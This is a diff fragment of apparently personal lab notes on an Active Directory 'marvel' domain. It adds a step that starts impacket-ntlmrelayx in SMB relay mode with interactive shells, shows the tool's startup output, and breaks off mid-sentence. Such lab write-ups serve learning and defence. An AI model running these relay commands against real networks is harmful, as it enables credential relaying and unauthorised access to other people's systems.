@@ -164,4 +164,31 @@ sudo nano /etc/responder/Responder.conf
 
 ![](assets/Pasted%20image%2020241217210326.png)
 
-- Start 
+- Start `impacket-ntlmrelayx`
+
+```
+┌─[hexadivine@parrot]─[/tmp]
+└──╼ $sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support  -i
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to hosts in targetfile
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+```
+
+- On Spiderman VM login with `marvel\pparker` and try connecting to random se
